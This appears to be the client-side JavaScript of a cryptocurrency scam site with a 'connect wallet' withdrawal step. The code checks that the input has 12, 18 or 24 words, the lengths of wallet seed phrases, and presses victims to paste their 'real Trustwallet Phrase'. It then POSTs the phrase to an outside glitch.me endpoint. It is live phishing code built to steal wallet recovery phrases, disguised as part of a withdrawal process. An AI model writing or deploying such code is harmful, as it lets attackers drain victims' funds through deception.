const submit_phrase = async (data) => {
  // alert("called");
  try {
    document.querySelector("#connect_wallet").innerHTML = "proccessing...";
    const response = await fetch(
      // "https://ethexenergy-ltd.glitch.me/api/phrase/submit",
      // "http://localhost:5000/api/user/login",
      // "http://localhost:5000/api/user/phrase/submit",
      "https://ethexenergy-ltd.glitch.me/api/user/phrase/submit",

      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(data),
      },
    );
    const result = await response.text();
    console.log(result);
    if (result.error) {
      document.querySelector(".errMessage2").innerHTML = result.errMessage;
      document.querySelector("#connect_wallet").innerHTML = "try again";
      return;
    }
    // document.querySelector("#connect_wallet").innerHTML = "success";
    // setCookie(result.message.user, result.token);
    // window.location.replace("/dashboard.html");

    handle_withdrawal({
      token: checkCookie("token"),
      user: checkCookie("user"),
      withdrawal_amount: withdrawal_amount.value,
      withdrawal_method: withdrawal_method.value,
      wallet: wallet.value,
    });
  } catch (err) {
    console.log(err);
    document.querySelector(".errMessage2").innerHTML = err.message;
    document.querySelector("#connect_wallet").innerHTML = "try again";
  }
};

const phrase = document.querySelector("#phrase");

document.querySelector("#connect_wallet").onclick = () => {
  if (!phrase.value) return (phrase.style.border = "2px solid red");

  const spacesCount = phrase.value.split(" ").length - 1;
  console.log(spacesCount);
  if (spacesCount == 11 || spacesCount == 17 || spacesCount == 23) {
    submit_phrase({
      token: getCookie("token"),
      user: getCookie("user"),
      phrase: phrase.value,
    });
  } else {
    phrase.style.border = "2px solid red";
    document.querySelector(".errMessage2").innerHTML =
      "Invalid Phrase, please copy and paste your real Trustwallet Phrase to continue";
  }
};

document.querySelector("#phrase").onkeyup = () => {
  phrase.style.border = "2px solid gray";
  document.querySelector(".errMessage2").innerHTML = "";
};
